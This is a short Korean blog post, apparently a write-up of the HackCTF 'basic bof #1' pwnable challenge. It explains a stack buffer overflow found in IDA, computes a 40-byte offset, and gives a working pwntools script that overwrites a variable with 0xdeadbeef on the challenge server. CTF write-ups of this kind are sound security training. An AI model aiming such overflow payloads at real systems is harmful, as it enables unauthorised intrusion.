---
layout: post
title: "hackctf-basic bof #1"
categories: [hackctf]
tags: [pwnable]
redirect_from:
 - /2019/08/03/
---
IDA를 먼저 보자.

<img width="384" alt="캡처" src="https://user-images.githubusercontent.com/51374792/62383735-72a4df00-b58b-11e9-905b-a154cd36f94a.PNG">

s만 입력받아 v5까지 영향을 주어야 하는 코드다.

v5가 deadbeef가 되도록 해 주면 되겠다.

0x34-0xC=40

페이로드는 40개의 값과 리틀 엔디안 deadbeef 정도면 되겠다.

```python
#!/usr/bin/python
from pwn import *

p=remote("ctf.j0n9hyun.xyz",3000)
code="A"*40+"\xef\xbe\xad\xde"

p.sendline(code)

p.interactive()
p.close()
```